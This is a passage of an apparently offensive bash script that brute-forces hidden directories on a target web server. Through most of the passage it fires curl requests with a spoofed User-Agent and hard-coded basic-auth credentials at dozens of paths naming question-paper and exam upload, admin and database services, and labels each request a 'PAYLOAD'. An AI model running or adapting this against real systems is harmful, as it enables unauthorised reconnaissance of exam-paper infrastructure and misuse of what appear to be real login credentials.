" "${target}QPBulk_Tool/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_Tool/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem-Upload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem-Upload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem-Upload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper_UploadService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper_UploadService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper_UploadService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper_Handler/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper_Handler/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper_Handler/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc_MonitoringTool/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc_MonitoringTool/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc_MonitoringTool/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUploadQPUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUploadQPUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUploadQPUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper-CloudSync/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper-CloudSync/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper-CloudSync/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Dashboard_QPAdmin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Dashboard_QPAdmin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Dashboard_QPAdmin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystem-QstnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystem-QstnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystem-QstnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadServiceQPBatch/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadServiceQPBatch/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadServiceQPBatch/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocProcessing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocProcessing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocProcessing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring-QPaperDoc/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring-QPaperDoc/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring-QPaperDoc/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control_QPSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control_QPSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control_QPSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper-MassUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper-MassUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper-MassUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystem_QP/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystem_QP/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystem_QP/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor_QstnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor_QstnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor_QstnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationQPBulk/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationQPBulk/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationQPBulk/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor-QPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor-QPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor-QPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUploadQPManager/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUploadQPManager/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUploadQPManager/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_CloudSync/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_CloudSync/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_CloudSync/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite-QPMgmt/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite-QPMgmt/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite-QPMgmt/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule_QPMaster/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule_QPMaster/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule_QPMaster/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing_Uploader/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing_Uploader/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing_Uploader/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader-QPAuto/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader-QPAuto/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader-QPAuto/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule_QPBFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule_QPBFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule_QPBFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_System/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P_System/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_System/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper-System/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper-System/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper-System/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploadProcessing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploadProcessing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploadProcessing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper_FileProcessor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper_FileProcessor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper_FileProcessor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService_QPProcessing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService_QPProcessing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService_QPProcessing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring-QuestionPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring-QuestionPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring-QuestionPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB_Monitoring/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB_Monitoring/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB_Monitoring/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager-DatabaseManager/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager-DatabaseManager/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager-DatabaseManager/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ModuleQPDatabase/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ModuleQPDatabase/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ModuleQPDatabase/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops_QPAdmin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops_QPAdmin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops_QPAdmin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaperProcessingSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaperProcessingSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaperProcessingSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync-QPBFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync-QPBFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync-QPBFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor_QPWorkflow/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor_QPWorkflow/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor_QPWorkflow/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService_DataPipeline/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService_DataPipeline/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService_DataPipeline/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync-QPBatch/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync-QPBatch/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync-QPBatch/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline-QPUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline-QPUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline-QPUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DashboardQPCloud/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
